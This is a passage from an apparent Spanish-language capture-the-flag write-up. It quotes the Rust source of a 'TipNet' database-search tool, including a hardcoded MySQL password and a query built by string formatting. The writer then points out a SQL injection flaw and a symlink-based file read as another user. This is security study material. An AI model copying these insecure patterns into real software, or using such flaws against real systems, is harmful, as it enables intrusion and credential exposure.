<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> output </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Command</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">(</span><span class="mtk4">"/usr/bin/whoami"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">output</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">expect</span><span class="mtk1">(</span><span class="mtk4">"nobody"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">from_utf8</span><span class="mtk1">(output</span><span class="mtk5">.</span><span class="mtk1">stdout)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> username </span><span class="mtk5">=</span><span class="mtk1"> username</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> justification</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[-] No justification provided. TipNet is under 70</span><span class="mtk4">2 authority; queries don't need warrants, but need</span><span class="mtk4"> to be justified. This incident has been logged an</span><span class="mtk4">d will be reported."</span><span class="mtk1">);</span>  
<span class="mtk1">        </span><span class="mtk8 mtku">logger</span><span class="mtk5">::</span><span class="mtk8">log</span><span class="mtk1">(username, keywords</span><span class="mtk5">.</span><span class="mtk8">as_str</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">(), </span><span class="mtk4">"Attempted to query TipNet without justification."</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8 mtku">logger</span><span class="mtk5">::</span><span class="mtk8">log</span><span class="mtk1">(username, keywords</span><span class="mtk5">.</span><span class="mtk8">as_str</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">(), justification</span><span class="mtk5">.</span><span class="mtk8">as_str</span><span class="mtk1">());</span>

<span class="mtk1">    </span><span class="mtk8">search_sigint</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> conn, keywords</span><span class="mtk5">.</span><span class="mtk8">as_str</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">());</span>

<span class="mtk1">}</span>

<span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">get_mode</span><span class="mtk1">() </span><span class="mtk5">-&gt;</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk1"> {</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> valid </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> mode </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1"> valid {</span>
<span class="mtk1">                mode</span><span class="mtk5">.</span><span class="mtk8">clear</span><span class="mtk1">();</span>

<span class="mtk1">                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Select mode of usage:"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk8">print!</span><span class="mtk1">(</span><span class="mtk4">"a) Upstream </span><span class="mtk6">\n</span><span class="mtk4">b) Regular (WIP)</span><span class="mtk6">\n</span><span class="mtk4">c) Emperor (WIP)</span><span class="mtk6">\n</span><span class="mtk4">d) SQUARE (WIP)</span><span class="mtk6">\n</span><span class="mtk4">e) Refresh Indeces</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">                </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdin</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">read_line</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> mode)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>

<span class="mtk1">                </span><span class="mtk5">match</span><span class="mtk1"> mode</span><span class="mtk5">.</span><span class="mtk8">trim</span><span class="mtk1">() {</span>
<span class="mtk1">                        </span><span class="mtk4">"a"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[+] Upstream selected"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"upstream"</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        </span><span class="mtk4">"b"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[+] Muscular selected"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"regular"</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        </span><span class="mtk4">"c"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[+] Tempora selected"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"emperor"</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        </span><span class="mtk4">"d"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[+] PRISM selected"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"square"</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        </span><span class="mtk4">"e"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[!] Refreshing indeces!"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"pull"</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        </span><span class="mtk4">"q"</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk4">"Q"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[-] Quitting"</span><span class="mtk1">);</span>
<span class="mtk1">                                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                        _ </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">[!] Invalid mode: {}"</span><span class="mtk1">, mode);</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                }</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> mode;</span>
<span class="mtk1">}</span>

<span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">connect_to_db</span><span class="mtk1">(db</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) </span><span class="mtk5">-&gt;</span><span class="mtk1"> </span><span class="mtk8 mtku">Result</span><span class="mtk1">&lt;mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">PooledConn</span><span class="mtk1">&gt; {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> url </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"mysql://tipnet:4The_Greater_GoodJ4A@localhost:330</span><span class="mtk4">6/Upstream"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> pool </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Pool</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">(url)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> conn </span><span class="mtk5">=</span><span class="mtk1"> pool</span><span class="mtk5">.</span><span class="mtk8">get_conn</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">Ok</span><span class="mtk1">(conn);</span>
<span class="mtk1">}</span>

<span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">search_sigint</span><span class="mtk1">(conn</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">PooledConn</span><span class="mtk1">, keywords</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> keywords</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">Vec</span><span class="mtk1">&lt;</span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">&gt; </span><span class="mtk5">=</span><span class="mtk1"> keywords</span><span class="mtk5">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">" "</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">collect</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> query </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk4">"SELECT timestamp, target, source, data FROM SIGIN</span><span class="mtk4">T WHERE "</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i, keyword) </span><span class="mtk5">in</span><span class="mtk1"> keywords</span><span class="mtk5">.</span><span class="mtk8">iter</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">enumerate</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> i </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> {</span>
<span class="mtk1">            query</span><span class="mtk5">.</span><span class="mtk8">push_str</span><span class="mtk1">(</span><span class="mtk4">"OR "</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">        query</span><span class="mtk5">.</span><span class="mtk8">push_str</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk8">format!</span><span class="mtk1">(</span><span class="mtk4">"data LIKE '%{}%' "</span><span class="mtk1">, keyword));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> selected_entries </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">query_map</span><span class="mtk1">(</span>
<span class="mtk1">        query,</span>
<span class="mtk1">        </span><span class="mtk5">|</span><span class="mtk1">(timestamp, target, source, data)</span><span class="mtk5">|</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Entry</span><span class="mtk1"> { timestamp, target, source, data }</span>
<span class="mtk1">        },</span>
<span class="mtk1">    )</span><span class="mtk5">.</span><span class="mtk8">expect</span><span class="mtk1">(</span><span class="mtk4">"Query failed."</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> e </span><span class="mtk5">in</span><span class="mtk1"> selected_entries {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[{}] {} ===&gt; {} | {}"</span><span class="mtk1">,</span>
<span class="mtk1">                 e</span><span class="mtk5">.</span><span class="mtk1">timestamp, e</span><span class="mtk5">.</span><span class="mtk1">source, e</span><span class="mtk5">.</span><span class="mtk1">target, e</span><span class="mtk5">.</span><span class="mtk1">data);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>

<span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">pull_indeces</span><span class="mtk1">(conn</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">PooledConn</span><span class="mtk1">, directory</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> paths </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8">read_dir</span><span class="mtk1">(directory)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">filter_map</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">ok</span><span class="mtk1">())</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">filter</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">path</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">extension</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">unwrap_or_default</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"txt"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">map</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">path</span><span class="mtk1">());</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> stmt_select </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">prep</span><span class="mtk1">(</span><span class="mtk4">"SELECT hash FROM tip_submissions WHERE hash = :ha</span><span class="mtk4">sh"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> stmt_insert </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">prep</span><span class="mtk1">(</span><span class="mtk4">"INSERT INTO tip_submissions (timestamp, data, has</span><span class="mtk4">h) VALUES (:timestamp, :data, :hash)"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> now </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Utc</span><span class="mtk5">::</span><span class="mtk8">now</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> path </span><span class="mtk5">in</span><span class="mtk1"> paths {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> contents </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8">read_to_string</span><span class="mtk1">(path)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> hash </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Sha256</span><span class="mtk5">::</span><span class="mtk8">digest</span><span class="mtk1">(contents</span><span class="mtk5">.</span><span class="mtk8">as_bytes</span><span class="mtk1">());</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> hash_hex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">hex</span><span class="mtk5">::</span><span class="mtk8">encode</span><span class="mtk1">(hash);</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> existing_entry</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">Option</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">String</span><span class="mtk1">&gt; </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">exec_first</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">stmt_select, </span><span class="mtk8">params!</span><span class="mtk1"> { </span><span class="mtk4">"hash"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">hash_hex })</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> existing_entry</span><span class="mtk5">.</span><span class="mtk8">is_none</span><span class="mtk1">() {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> date </span><span class="mtk5">=</span><span class="mtk1"> now</span><span class="mtk5">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk4">"%Y-%m-%d"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[+] {}</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, contents);</span>
<span class="mtk1">            conn</span><span class="mtk5">.</span><span class="mtk8">exec_drop</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">stmt_insert, </span><span class="mtk8">params!</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk4">"timestamp"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> date,</span>
<span class="mtk1">                </span><span class="mtk4">"data"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> contents,</span>
<span class="mtk1">                </span><span class="mtk4">"hash"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">hash_hex,</span>
<span class="mtk1">                },</span>
<span class="mtk1">                )</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk8 mtku">logger</span><span class="mtk5">::</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"ROUTINE"</span><span class="mtk1">, </span><span class="mtk4">" - "</span><span class="mtk1">, </span><span class="mtk4">"Pulling fresh submissions into database."</span><span class="mtk1">);</span>

<span class="mtk1">}</span>
</code></pre></div><p>Es un poco abrumador. De hecho, contiene dos vulnerabilidades, pero no son útiles:</p><ul><li>Inyección de código SQL (<code>format!("data LIKE '%{}%' ", keyword)</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">search_sigint</span><span class="mtk1">(conn</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">PooledConn</span><span class="mtk1">, keywords</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> keywords</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">Vec</span><span class="mtk1">&lt;</span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">&gt; </span><span class="mtk5">=</span><span class="mtk1"> keywords</span><span class="mtk5">.</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">" "</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">collect</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> query </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">from</span><span class="mtk1">(</span><span class="mtk4">"SELECT timestamp, target, source, data FROM SIGIN</span><span class="mtk4">T WHERE "</span><span class="mtk1">);</span>  

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i, keyword) </span><span class="mtk5">in</span><span class="mtk1"> keywords</span><span class="mtk5">.</span><span class="mtk8">iter</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">enumerate</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> i </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> {</span>
<span class="mtk1">            query</span><span class="mtk5">.</span><span class="mtk8">push_str</span><span class="mtk1">(</span><span class="mtk4">"OR "</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">        query</span><span class="mtk5">.</span><span class="mtk8">push_str</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk8">format!</span><span class="mtk1">(</span><span class="mtk4">"data LIKE '%{}%' "</span><span class="mtk1">, keyword));</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> selected_entries </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">query_map</span><span class="mtk1">(</span>
<span class="mtk1">        query,</span>
<span class="mtk1">        </span><span class="mtk5">|</span><span class="mtk1">(timestamp, target, source, data)</span><span class="mtk5">|</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Entry</span><span class="mtk1"> { timestamp, target, source, data }</span>
<span class="mtk1">        },</span>
<span class="mtk1">    )</span><span class="mtk5">.</span><span class="mtk8">expect</span><span class="mtk1">(</span><span class="mtk4">"Query failed."</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> e </span><span class="mtk5">in</span><span class="mtk1"> selected_entries {</span>
<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[{}] {} ===&gt; {} | {}"</span><span class="mtk1">,</span>
<span class="mtk1">                 e</span><span class="mtk5">.</span><span class="mtk1">timestamp, e</span><span class="mtk5">.</span><span class="mtk1">source, e</span><span class="mtk5">.</span><span class="mtk1">target, e</span><span class="mtk5">.</span><span class="mtk1">data);</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><ul><li>Lectura de archivos como <code>atlas</code> mediante <em>symlinks</em>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">pull_indeces</span><span class="mtk1">(conn</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk5">::</span><span class="mtk8 mtku">PooledConn</span><span class="mtk1">, directory</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">str</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> paths </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8">read_dir</span><span class="mtk1">(directory)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">filter_map</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">ok</span><span class="mtk1">())</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">filter</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">path</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">extension</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">unwrap_or_default</span><span class="mtk1">() </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"txt"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">map</span><span class="mtk1">(</span><span class="mtk5">|</span><span class="mtk1">entry</span><span class="mtk5">|</span><span class="mtk1"> entry</span><span class="mtk5">.</span><span class="mtk8">path</span><span class="mtk1">());</span>

<span class="mtk3">    // ...</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> path </span><span class="mtk5">in</span><span class="mtk1"> paths {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> contents </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk5">::</span><span class="mtk8">read_to_string</span><span class="mtk1">(path)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> hash </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Sha256</span><span class="mtk5">::</span><span class="mtk8">digest</span><span class="mtk1">(contents</span><span class="mtk5">.</span><span class="mtk8">as_bytes</span><span class="mtk1">());</span>
<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> hash_hex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">hex</span><span class="mtk5">::</span><span class="mtk8">encode</span><span class="mtk1">(hash);</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> existing_entry</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">Option</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">String</span><span class="mtk1">&gt; </span><span class="mtk5">=</span><span class="mtk1"> conn</span><span class="mtk5">.</span><span class="mtk8">exec_first</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">stmt_select, </span><span class="mtk8">params!</span><span class="mtk1"> { </span><span class="mtk4">"hash"</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">hash_hex })</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> existing_entry</span><span class="mtk5">.</span><span class="mtk8">is_none</span><span class="mtk1">() {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">let</span><span class="mtk1"> date </span><span class="mtk5">=</span><span class="mtk1"> now</span><span class="mtk5">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk4">"%Y-%m-%d"</span><span class="mtk1">)</span><span class="mtk5">.</span><span class="mtk8">to_string</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"[+] {}</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, contents);</span>
